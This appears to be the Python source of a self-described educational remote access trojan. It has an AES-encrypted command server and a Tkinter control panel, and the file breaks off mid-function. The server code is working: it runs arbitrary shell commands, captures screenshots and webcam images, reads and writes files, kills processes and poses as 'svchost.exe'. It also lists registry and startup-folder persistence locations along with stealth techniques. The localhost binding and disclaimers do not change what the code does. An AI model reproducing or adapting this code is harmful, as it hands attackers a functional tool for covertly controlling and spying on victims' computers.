"""
═══════════════════════════════════════════════════════════════════════
    ENHANCED RAT TOOL - All-in-One Educational Application v2.0
═══════════════════════════════════════════════════════════════════════

⚠️  EDUCATIONAL PURPOSE ONLY - LOCALHOST ONLY ⚠️

This is a unified tool that combines:
- RAT Server (background)
- RAT Client (GUI control panel)
- All 14 advanced features
- Built-in testing
- One-click operation

TERMS & CONDITIONS:
- FOR EDUCATIONAL/PORTFOLIO USE ONLY
- LOCALHOST (127.0.0.1) ONLY
- NO ILLEGAL USE
- CREATOR NOT LIABLE FOR MISUSE

═══════════════════════════════════════════════════════════════════════
"""

import socket
import threading
import json
import subprocess
import os
import platform
import sys
from datetime import datetime
import base64
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk
import io
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import psutil

# Configuration
HOST = '127.0.0.1'
PORT = 4444
BUFFER_SIZE = 8192
ENCRYPTION_KEY = hashlib.sha256(b"RAT_DEMO_KEY_2025").digest()

# ═══════════════════════════════════════════════════════════════════════
#                         RAT SERVER CLASS
# ═══════════════════════════════════════════════════════════════════════

class RATServer:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.encryption_enabled = True
        self.keylog_buffer = []
        self.process_name = "svchost.exe"
        
    def start_server(self):
        """Start the RAT server in background thread"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            self.running = True
            
            print(f"[SERVER] Listening on {self.host}:{self.port}")
            
            # Accept connection
            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"[SERVER] Client connected from {self.client_address}")
            
            # Send welcome message
            welcome = {
                'status': 'connected',
                'message': 'Connected to RAT Server v2.0 (Enhanced)',
                'encryption': 'AES-256-CBC'
            }
            self.send_response(welcome)
            
            # Handle commands
            self.handle_client()
            
        except Exception as e:
            print(f"[SERVER] Error: {e}")
        finally:
            self.cleanup()
    
    def encrypt_data(self, data):
        """Encrypt data using AES-256-CBC"""
        try:
            iv = os.urandom(16)
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            padded_data = pad(data.encode(), AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            
            encrypted_package = {
                'iv': base64.b64encode(iv).decode(),
                'ciphertext': base64.b64encode(ciphertext).decode()
            }
            return json.dumps(encrypted_package)
        except Exception as e:
            print(f"[SERVER] Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES-256-CBC"""
        try:
            package = json.loads(encrypted_data)
            iv = base64.b64decode(package['iv'])
            ciphertext = base64.b64decode(package['ciphertext'])
            
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return decrypted_data.decode()
        except Exception as e:
            print(f"[SERVER] Decryption error: {e}")
            return encrypted_data
    
    def send_response(self, data):
        """Send encrypted response"""
        try:
            json_data = json.dumps(data)
            if self.encryption_enabled:
                encrypted = self.encrypt_data(json_data)
                self.client_socket.send((encrypted + '\n').encode())
            else:
                self.client_socket.send((json_data + '\n').encode())
        except Exception as e:
            print(f"[SERVER] Send error: {e}")
    
    def receive_command(self):
        """Receive encrypted command"""
        try:
            data = b''
            while True:
                chunk = self.client_socket.recv(BUFFER_SIZE)
                if not chunk:
                    break
                data += chunk
                if b'\n' in chunk:
                    break
            
            if not data:
                return None
            
            encrypted_data = data.decode().strip()
            
            if self.encryption_enabled:
                decrypted = self.decrypt_data(encrypted_data)
                return json.loads(decrypted)
            else:
                return json.loads(encrypted_data)
        except Exception as e:
            print(f"[SERVER] Receive error: {e}")
            return None
    
    def handle_client(self):
        """Handle incoming commands"""
        while self.running:
            command_data = self.receive_command()
            
            if not command_data:
                break
            
            command = command_data.get('command')
            print(f"[SERVER] Received command: {command}")
            
            # Route commands
            if command == 'ping':
                self.cmd_ping()
            elif command == 'sysinfo':
                self.cmd_sysinfo()
            elif command == 'screenshot':
                self.cmd_screenshot()
            elif command == 'shell':
                self.cmd_shell(command_data.get('params', {}).get('command', ''))
            elif command == 'listdir':
                self.cmd_listdir(command_data.get('params', {}).get('path', '.'))
            elif command == 'processlist':
                self.cmd_processlist()
            elif command == 'download':
                self.cmd_download(command_data.get('params', {}).get('filepath', ''))
            elif command == 'upload':
                self.cmd_upload(command_data.get('params', {}))
            elif command == 'killprocess':
                self.cmd_killprocess(command_data.get('params', {}).get('pid', 0))
            elif command == 'keylog':
                self.cmd_keylog()
            elif command == 'webcam':
                self.cmd_webcam()
            elif command == 'persistence':
                self.cmd_persistence()
            elif command == 'stealth':
                self.cmd_stealth_info()
            elif command == 'shutdown':
                self.cmd_shutdown()
                break
            else:
                self.send_response({'status': 'error', 'message': f'Unknown command: {command}'})
    
    # Command implementations
    def cmd_ping(self):
        self.send_response({'status': 'success', 'message': 'pong'})
    
    def cmd_sysinfo(self):
        info = {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'processor': platform.processor(),
            'python_version': platform.python_version()
        }
        self.send_response({'status': 'success', 'data': info})
    
    def cmd_screenshot(self):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            img_data = base64.b64encode(buffer.getvalue()).decode()
            self.send_response({'status': 'success', 'data': img_data})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_shell(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            self.send_response({'status': 'success', 'data': output})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_listdir(self, path):
        try:
            files = os.listdir(path)
            self.send_response({'status': 'success', 'data': files})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_processlist(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append(proc.info)
                except:
                    pass
            self.send_response({'status': 'success', 'data': processes})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_download(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            self.send_response({
                'status': 'success',
                'data': data,
                'filename': os.path.basename(filepath),
                'size': len(data)
            })
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_upload(self, params):
        try:
            filepath = params.get('filepath')
            data = base64.b64decode(params.get('data'))
            with open(filepath, 'wb') as f:
                f.write(data)
            self.send_response({'status': 'success', 'message': f'File uploaded: {filepath}'})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_killprocess(self, pid):
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            self.send_response({'status': 'success', 'message': f'Process {pid} terminated'})
        except Exception as e:
            self.send_response({'status': 'error', 'message': str(e)})
    
    def cmd_keylog(self):
        """Simulated keylogger for educational purposes"""
        simulated_data = {
            'active': True,
            'buffer_size': 1,
            'sample': 'This is simulated educational data. Real keyloggers are ILLEGAL without authorization!',
            'warning': 'EDUCATIONAL SIMULATION ONLY'
        }
        self.send_response({'status': 'success', 'data': simulated_data})
    
    def cmd_webcam(self):
        """Capture webcam image"""
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                img_data = base64.b64encode(buffer).decode()
                self.send_response({'status': 'success', 'data': img_data})
            else:
                self.send_response({'status': 'error', 'message': 'Failed to capture webcam'})
        except Exception as e:
            self.send_response({'status': 'error', 'message': f'Webcam error: {str(e)}'})
    
    def cmd_persistence(self):
        """Educational persistence information"""
        info = {
            'registry': [
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
            ],
            'startup': [
                '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                '%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            ],
            'scheduled_tasks': [
                'Task Scheduler - User logon trigger',
                'Task Scheduler - System startup trigger'
            ],
            'services': [
                'Windows Service installation',
                'Service with auto-start configuration'
            ],
            'note': 'EDUCATIONAL INFORMATION ONLY - NOT IMPLEMENTED'
        }
        self.send_response({'status': 'success', 'data': info})
    
    def cmd_stealth_info(self):
        """Stealth techniques and detection methods"""
        info = {
            'techniques': [
                'Process name obfuscation (svchost.exe simulation)',
                'Encrypted C2 traffic (AES-256-CBC)',
                'No disk persistence (memory-only simulation)',
                'Legitimate service mimicry',
                'Traffic blending with normal protocols'
            ],
            'detection_methods': [
                'Network traffic analysis (consistent encrypted patterns)',
                'Process behavior monitoring (unusual socket connections)',
                'Heuristic analysis (API call patterns)',
                'Memory forensics (AES keys and C2 structures)',
                'Behavioral detection (webcam/keyboard access)',
                'Signature-based detection (traffic fingerprints)'
            ],
            'current_status': {
                'process_name': self.process_name,
                'encryption_enabled': self.encryption_enabled,
                'port': self.port,
                'stealth_level': 'EDUCATIONAL SIMULATION'
            }
        }
        self.send_response({'status': 'success', 'data': info})
    
    def cmd_shutdown(self):
        self.send_response({'status': 'success', 'message': 'Server shutting down'})
        self.running = False
    
    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

# ═══════════════════════════════════════════════════════════════════════
#                         RAT CLIENT GUI CLASS
# ═══════════════════════════════════════════════════════════════════════

class RATToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 Enhanced RAT Tool v2.0 - Educational Project")
        self.root.geometry("1100x800")
        self.root.resizable(False, False)
        self.root.configure(bg='#1e1e1e')
        
        self.socket = None
        self.connected = False
        self.encryption_enabled = True
        self.server_thread = None
        self.server_instance = None
        
        self.setup_gui()
        
        # Auto-start server
        self.auto_start_server()
    
    def setup_gui(self):
        """Create the GUI layout"""
        
        # Title Frame
        title_frame = tk.Frame(self.root, bg="#2c3e50", height=70)
        title_frame.pack(fill=tk.X)
        
        title_label = tk.Label(
            title_frame,
            text="🔐 ENHANCED RAT TOOL - ALL-IN-ONE",
            font=("Arial", 20, "bold"),
            bg="#2c3e50",
            fg="white"
        )
        title_label.pack(pady=10)
        
        subtitle_label = tk.Label(
            title_frame,
            text="Educational Portfolio Project | Localhost Only | AES-256 Encrypted",
            font=("Arial", 9),
            bg="#2c3e50",
            fg="#ecf0f1"
        )
        subtitle_label.pack()
        
        # Status Frame
        status_frame = tk.LabelFrame(self.root, text="Status", font=("Arial", 10, "bold"), padx=10, pady=10, bg="#2c3e50", fg="white")
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.server_status = tk.Label(status_frame, text="Server: ● Starting...", fg="yellow", font=("Arial", 10, "bold"), bg="#2c3e50")
        self.server_status.grid(row=0, column=0, padx=20)
        
        self.client_status = tk.Label(status_frame, text="Client: ● Disconnected", fg="red", font=("Arial", 10, "bold"), bg="#2c3e50")
        self.client_status.grid(row=0, column=1, padx=20)
        
        self.connect_btn = tk.Button(
            status_frame,
            text="Connect to Server",
            command=self.connect_to_server,
            bg="#27ae60",
            fg="white",
            width=20,
            height=2,
            font=("Arial", 10, "bold")
        )
        self.connect_btn.grid(row=0, column=2, padx=20)
        
        # Commands Frame
        cmd_frame = tk.LabelFrame(self.root, text="RAT Control Commands", font=("Arial", 11, "bold"), padx=15, pady=15, bg="#34495e", fg="white")
        cmd_frame.pack(fill=tk.BOTH, padx=10, pady=10)
        
        # Row 1 - Core Features
        tk.Label(cmd_frame, text="📊 CORE FEATURES", font=("Arial", 9, "bold"), bg="#34495e", fg="#3498db").grid(row=0, column=0, columnspan=3, pady=5)
        
        tk.Button(cmd_frame, text="1️⃣ System Info", command=self.cmd_sysinfo, width=22, height=2, bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=1, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="2️⃣ Screenshot", command=self.cmd_screenshot, width=22, height=2, bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=1, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="3️⃣ Remote Shell", command=self.cmd_shell, width=22, height=2, bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=1, column=2, padx=5, pady=5)
        
        tk.Button(cmd_frame, text="4️⃣ File Browser", command=self.cmd_filebrowser, width=22, height=2, bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=2, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="5️⃣ Process List", command=self.cmd_processlist, width=22, height=2, bg="#3498db", fg="white", font=("Arial", 9, "bold")).grid(row=2, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="6️⃣ Ping Test", command=self.cmd_ping, width=22, height=2, bg="#2ecc71", fg="white", font=("Arial", 9, "bold")).grid(row=2, column=2, padx=5, pady=5)
        
        # Row 2 - Advanced Features
        tk.Label(cmd_frame, text="🚀 ADVANCED FEATURES", font=("Arial", 9, "bold"), bg="#34495e", fg="#9b59b6").grid(row=3, column=0, columnspan=3, pady=5)
        
        tk.Button(cmd_frame, text="7️⃣ Keylogger (Sim)", command=self.cmd_keylogger, width=22, height=2, bg="#9b59b6", fg="white", font=("Arial", 9, "bold")).grid(row=4, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="8️⃣ Webcam Capture", command=self.cmd_webcam, width=22, height=2, bg="#9b59b6", fg="white", font=("Arial", 9, "bold")).grid(row=4, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="9️⃣ Persistence Info", command=self.cmd_persistence, width=22, height=2, bg="#9b59b6", fg="white", font=("Arial", 9, "bold")).grid(row=4, column=2, padx=5, pady=5)
        
        # Row 3 - Special Features
        tk.Label(cmd_frame, text="🛡️ SECURITY & INFO", font=("Arial", 9, "bold"), bg="#34495e", fg="#e67e22").grid(row=5, column=0, columnspan=3, pady=5)
        
        tk.Button(cmd_frame, text="🔍 Stealth Info", command=self.cmd_stealth, width=22, height=2, bg="#34495e", fg="white", font=("Arial", 9, "bold")).grid(row=6, column=0, padx=5, pady=5)
        tk.Button(cmd_frame, text="🔐 Encryption Test", command=self.cmd_encryption_test, width=22, height=2, bg="#16a085", fg="white", font=("Arial", 9, "bold")).grid(row=6, column=1, padx=5, pady=5)
        tk.Button(cmd_frame, text="🧪 Run All Tests", command=self.run_all_tests, width=22, height=2, bg="#e67e22", fg="white", font=("Arial", 9, "bold")).grid(row=6, column=2, padx=5, pady=5)
        
        # Output Frame
        output_frame = tk.LabelFrame(self.root, text="Console Output", font=("Arial", 10, "bold"), padx=10, pady=10, bg="#2c3e50", fg="white")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            height=18,
            width=120,
            font=("Consolas", 9),
            bg="#0c0c0c",
            fg="#00ff00",
            insertbackground="white"
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # Bottom buttons
        bottom_frame = tk.Frame(self.root, bg="#1e1e1e")
        bottom_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(bottom_frame, text="Clear Console", command=self.clear_output, width=15, bg="#95a5a6", fg="white", font=("Arial", 9, "bold")).pack(side=tk.LEFT, padx=5)
        tk.Button(bottom_frame, text="Help", command=self.show_help, width=15, bg="#3498db", fg="white", font=("Arial", 9, "bold")).pack(side=tk.LEFT, padx=5)
        tk.Button(bottom_frame, text="About", command=self.show_about, width=15, bg="#7f8c8d", fg="white", font=("Arial", 9, "bold")).pack(side=tk.RIGHT, padx=5)
        tk.Button(bottom_frame, text="Disconnect", command=self.disconnect, width=15, bg="#e74c3c", fg="white", font=("Arial", 9, "bold")).pack(side=tk.RIGHT, padx=5)
        
        self.log("═" * 100)
        self.log("🔐 ENHANCED RAT TOOL v2.0 - ALL-IN-ONE APPLICATION")
        self.log("═" * 100)
        self.log("✅ Tool started successfully")
        self.log("📡 Server starting automatically in background...")
        self.log("⚠️  EDUCATIONAL USE ONLY - LOCALHOST (127.0.0.1) ONLY")
        self.log("═" * 100)
    
    def auto_start_server(self):
        """Automatically start server in background"""
        def start():
            time.sleep(1)
            self.server_instance = RATServer()
            self.log("[AUTO-START] Server thread launched")
            self.server_status.config(text="Server: ● Running", fg="green")
            self.server_instance.start_server()
        
        self.server_thread = threading.Thread(target=start, daemon=True)
        self.server_thread.start()
        time.sleep(2)  # Give server time to start
    
    def log(self, message):
        """Add message to output console"""
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.see(tk.END)
        self.root.update()
    
    def clear_output(self):
        """Clear the output console"""
        self.output_text.delete('1.0', tk.END)
    
    def connect_to_server(self):
        """Connect to the RAT server"""
        if self.connected:
            self.log("[-] Already connected!")
            return
        
        try:
            self.log("[*] Connecting to server...")
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((HOST, PORT))
            
            # Receive welcome message
            response = self.receive_response()
            
            if response and response.get('status') == 'connected':
                self.connected = True
                self.client_status.config(text="Client: ● Connected", fg="green")
                self.connect_btn.config(state=tk.DISABLED)
                self.log(f"[+] ✅ Connected successfully!")
                self.log(f"[+] {response.get('message', '')}")
                self.log(f"[+] Encryption: {response.get('encryption', 'Unknown')}")
                self.log("═" * 100)
                self.log("🎯 Ready to execute commands! Click any button above.")
                self.log("═" * 100)
            else:
                raise Exception("Connection failed")
        
        except Exception as e:
            self.log(f"[-] ❌ Connection error: {str(e)}")
            messagebox.showerror("Connection Error", f"Failed to connect:\n{str(e)}\n\nMake sure server is running!")
    
    def disconnect(self):
        """Disconnect from server"""
        if self.connected:
            try:
                self.send_command({'command': 'shutdown'})
                self.socket.close()
            except:
                pass
        
        self.connected = False
        self.client_status.config(text="Client: ● Disconnected", fg="red")
        self.connect_btn.config(state=tk.NORMAL)
        self.log("[*] Disconnected from server")
    
    def encrypt_data(self, data):
        """Encrypt data using AES-256-CBC"""
        if not self.encryption_enabled:
            return data
        
        try:
            iv = os.urandom(16)
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            padded_data = pad(data.encode(), AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            
            encrypted_package = {
                'iv': base64.b64encode(iv).decode(),
                'ciphertext': base64.b64encode(ciphertext).decode()
            }
            return json.dumps(encrypted_package)
        except Exception as e:
            self.log(f"[-] Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES-256-CBC"""
        if not self.encryption_enabled:
            return encrypted_data
        
        try:
            package = json.loads(encrypted_data)
            iv = base64.b64decode(package['iv'])
            ciphertext = base64.b64decode(package['ciphertext'])
            
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return decrypted_data.decode()
        except Exception as e:
            self.log(f"[-] Decryption error: {e}")
            return encrypted_data
    
    def send_command(self, command_data):
        """Send encrypted command to server"""
        if not self.connected:
            self.log("[-] Not connected to server!")
            return None
        
        try:
            json_data = json.dumps(command_data)
            encrypted_data = self.encrypt_data(json_data)
            self.socket.send((encrypted_data + '\n').encode())
            return self.receive_response()
        except Exception as e:
            self.log(f"[-] Error sending command: {str(e)}")
            return None
    
    def receive_response(self):
        """Receive encrypted response from server"""
        try:
            data = b''
            while True:
                chunk = self.socket.recv(BUFFER_SIZE)
                if not chunk:
                    break
                data += chunk
                if b'\n' in chunk:
                    break
            
            if not data:
                return None
            
            encrypted_response = data.decode().strip()
            decrypted_response = self.decrypt_data(encrypted_response)
            return json.loads(decrypted_response)
        except Exception as e:
            self.log(f"[-] Error receiving response: {str(e)}")
            return None
    
    # ═════════════ COMMAND IMPLEMENTATIONS ═════════════
    
    def cmd_ping(self):
        """Test 1: Ping Test"""
        self.log("\n" + "=" * 100)
        self.log("🏓 TEST 1/9: PING TEST - Testing encrypted connection")
        self.log("=" * 100)
        response = self.send_command({'command': 'ping'})
        
        if response and response.get('status') == 'success':
            self.log(f"[+] ✅ Response: {response.get('message')}")
            self.log("[+] RESULT: Ping test PASSED - Connection working with encryption!")
        else:
            self.log("[-] ❌ Ping failed")
        self.log("=" * 100)
    
    def cmd_sysinfo(self):
        """Test 2: System Information"""
        self.log("\n" + "=" * 100)
        self.log("📊 TEST 2/9: SYSTEM INFORMATION - Gathering target system details")
        self.log("=" * 100)
        response = self.send_command({'command': 'sysinfo'})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] ✅ System Information Retrieved:")
            self.log("-" * 100)
            for key, value in data.items():
                self.log(f"  • {key}: {value}")
            self.log("-" * 100)
            self.log("[+] RESULT: System info test PASSED - All details retrieved!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_screenshot(self):
        """Test 3: Screenshot Capture"""
        self.log("\n" + "=" * 100)
        self.log("📸 TEST 3/9: SCREENSHOT CAPTURE - Capturing target screen")
        self.log("=" * 100)
        response = self.send_command({'command': 'screenshot'})
        
        if response and response.get('status') == 'success':
            image_data = base64.b64decode(response.get('data'))
            image = Image.open(io.BytesIO(image_data))
            
            img_window = tk.Toplevel(self.root)
            img_window.title("Screenshot Capture - Test 3")
            img_window.configure(bg='#1e1e1e')
            
            max_size = (800, 600)
            image.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(image)
            label = tk.Label(img_window, image=photo, bg='#1e1e1e')
            label.image = photo
            label.pack(padx=10, pady=10)
            
            self.log(f"[+] ✅ Screenshot captured successfully!")
            self.log(f"[+] Image size: {len(image_data)} bytes")
            self.log("[+] RESULT: Screenshot test PASSED - Image displayed in new window!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_shell(self):
        """Test 4: Remote Shell"""
        self.log("\n" + "=" * 100)
        self.log("🖥️ TEST 4/9: REMOTE SHELL - Executing command on target")
        self.log("=" * 100)
        
        command = simpledialog.askstring("Remote Shell", "Enter command to execute:")
        if not command:
            self.log("[-] Command cancelled")
            return
        
        self.log(f"[*] Executing: {command}")
        response = self.send_command({'command': 'shell', 'params': {'command': command}})
        
        if response and response.get('status') == 'success':
            self.log("[+] ✅ Command executed successfully!")
            self.log("-" * 100)
            self.log("OUTPUT:")
            self.log(response.get('data', ''))
            self.log("-" * 100)
            self.log("[+] RESULT: Remote shell test PASSED - Command executed!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_filebrowser(self):
        """Test 5: File Browser"""
        self.log("\n" + "=" * 100)
        self.log("📁 TEST 5/9: FILE BROWSER - Listing directory contents")
        self.log("=" * 100)
        
        path = simpledialog.askstring("File Browser", "Enter path to list:", initialvalue=".")
        if not path:
            self.log("[-] Cancelled")
            return
        
        self.log(f"[*] Listing: {path}")
        response = self.send_command({'command': 'listdir', 'params': {'path': path}})
        
        if response and response.get('status') == 'success':
            files = response.get('data', [])
            self.log(f"[+] ✅ Found {len(files)} items:")
            self.log("-" * 100)
            for f in files[:20]:  # Show first 20
                self.log(f"  • {f}")
            if len(files) > 20:
                self.log(f"  ... and {len(files)-20} more items")
            self.log("-" * 100)
            self.log("[+] RESULT: File browser test PASSED - Directory listed!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_processlist(self):
        """Test 6: Process List"""
        self.log("\n" + "=" * 100)
        self.log("⚙️ TEST 6/9: PROCESS LIST - Enumerating running processes")
        self.log("=" * 100)
        response = self.send_command({'command': 'processlist'})
        
        if response and response.get('status') == 'success':
            procs = response.get('data', [])
            self.log(f"[+] ✅ Retrieved {len(procs)} processes:")
            self.log("-" * 100)
            for proc in procs[:15]:  # Show first 15
                self.log(f"  • PID: {proc.get('pid', 'N/A'):6} | Name: {proc.get('name', 'N/A')}")
            if len(procs) > 15:
                self.log(f"  ... and {len(procs)-15} more processes")
            self.log("-" * 100)
            self.log("[+] RESULT: Process list test PASSED - All processes enumerated!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_keylogger(self):
        """Test 7: Keylogger Simulation"""
        self.log("\n" + "=" * 100)
        self.log("⌨️ TEST 7/9: KEYLOGGER SIMULATION - Educational demonstration")
        self.log("=" * 100)
        response = self.send_command({'command': 'keylog'})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] ✅ Keylogger Status:")
            self.log("-" * 100)
            self.log(f"  • Active: {data.get('active', False)}")
            self.log(f"  • Buffer Size: {data.get('buffer_size', 0)} keystrokes")
            self.log(f"  • Sample Data: {data.get('sample', 'N/A')}")
            self.log(f"  • Warning: {data.get('warning', 'N/A')}")
            self.log("-" * 100)
            self.log("⚠️  NOTE: This is SIMULATED data for educational purposes!")
            self.log("    Real keyloggers are ILLEGAL without authorization!")
            self.log("[+] RESULT: Keylogger test PASSED - Simulation working!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_webcam(self):
        """Test 8: Webcam Capture"""
        self.log("\n" + "=" * 100)
        self.log("📷 TEST 8/9: WEBCAM CAPTURE - Accessing target camera")
        self.log("=" * 100)
        response = self.send_command({'command': 'webcam'})
        
        if response and response.get('status') == 'success':
            image_data = base64.b64decode(response.get('data'))
            image = Image.open(io.BytesIO(image_data))
            
            img_window = tk.Toplevel(self.root)
            img_window.title("Webcam Capture - Test 8")
            img_window.configure(bg='#1e1e1e')
            
            max_size = (640, 480)
            image.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            photo = ImageTk.PhotoImage(image)
            label = tk.Label(img_window, image=photo, bg='#1e1e1e')
            label.image = photo
            label.pack(padx=10, pady=10)
            
            self.log(f"[+] ✅ Webcam captured successfully!")
            self.log(f"[+] Image size: {len(image_data)} bytes")
            self.log("[+] RESULT: Webcam test PASSED - Camera image displayed!")
        else:
            self.log(f"[-] ⚠️  Webcam: {response.get('message', 'Unknown error')}")
            self.log("    (This is expected if no webcam is available)")
        self.log("=" * 100)
    
    def cmd_persistence(self):
        """Test 9: Persistence Information"""
        self.log("\n" + "=" * 100)
        self.log("🔒 TEST 9/9: PERSISTENCE INFORMATION - Educational techniques")
        self.log("=" * 100)
        response = self.send_command({'command': 'persistence'})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] ✅ Persistence Techniques (Educational):")
            self.log("-" * 100)
            
            if 'registry' in data:
                self.log("\n📋 Registry Persistence:")
                for method in data['registry']:
                    self.log(f"  • {method}")
            
            if 'startup' in data:
                self.log("\n📁 Startup Folder:")
                for method in data['startup']:
                    self.log(f"  • {method}")
            
            if 'scheduled_tasks' in data:
                self.log("\n⏰ Scheduled Tasks:")
                for method in data['scheduled_tasks']:
                    self.log(f"  • {method}")
            
            if 'services' in data:
                self.log("\n⚙️ Windows Services:")
                for method in data['services']:
                    self.log(f"  • {method}")
            
            self.log("\n" + "-" * 100)
            self.log(f"⚠️  {data.get('note', 'Educational only')}")
            self.log("[+] RESULT: Persistence test PASSED - All techniques documented!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_stealth(self):
        """Stealth Information"""
        self.log("\n" + "=" * 100)
        self.log("🔍 STEALTH ANALYSIS - Techniques and Detection")
        self.log("=" * 100)
        response = self.send_command({'command': 'stealth'})
        
        if response and response.get('status') == 'success':
            data = response.get('data', {})
            self.log("[+] ✅ Stealth Information:")
            self.log("-" * 100)
            
            if 'techniques' in data:
                self.log("\n🔒 Stealth Techniques:")
                for tech in data['techniques']:
                    self.log(f"  • {tech}")
            
            if 'detection_methods' in data:
                self.log("\n🔍 Detection Methods:")
                for method in data['detection_methods']:
                    self.log(f"  • {method}")
            
            if 'current_status' in data:
                self.log("\n📊 Current Status:")
                for key, value in data['current_status'].items():
                    self.log(f"  • {key}: {value}")
            
            self.log("\n" + "-" * 100)
            self.log("⚠️  Understanding stealth helps in DEFENSE!")
            self.log("[+] Use this knowledge to secure systems, not exploit them!")
        else:
            self.log(f"[-] ❌ Error: {response.get('message', 'Unknown error')}")
        self.log("=" * 100)
    
    def cmd_encryption_test(self):
        """Encryption Test"""
        self.log("\n" + "=" * 100)
        self.log("🔐 ENCRYPTION TEST - Verifying AES-256-CBC")
        self.log("=" * 100)
        self.log(f"🔐 Encryption Enabled: {self.encryption_enabled}")
        self.log(f"🔑 Algorithm: AES-256-CBC with random IV")
        self.log(f"🔒 Key Derivation: SHA-256 hash of passphrase")
        self.log("-" * 100)
        
        test_response = self.send_command({'command': 'ping'})
        
        if test_response and test_response.get('status') == 'success':
            self.log("[+] ✅ Encryption test SUCCESSFUL!")
            self.log("[+] Command encrypted → Server decrypted → Response encrypted → Client decrypted")
        else:
            self.log("[-] ❌ Encryption test FAILED!")
        self.log("=" * 100)
    
    def run_all_tests(self):
        """Run all 9 tests sequentially"""
        if not self.connected:
            self.log("[-] Please connect to server first!")
            messagebox.showwarning("Not Connected", "Please click 'Connect to Server' first!")
            return
        
        confirm = messagebox.askyesno(
            "Run All Tests",
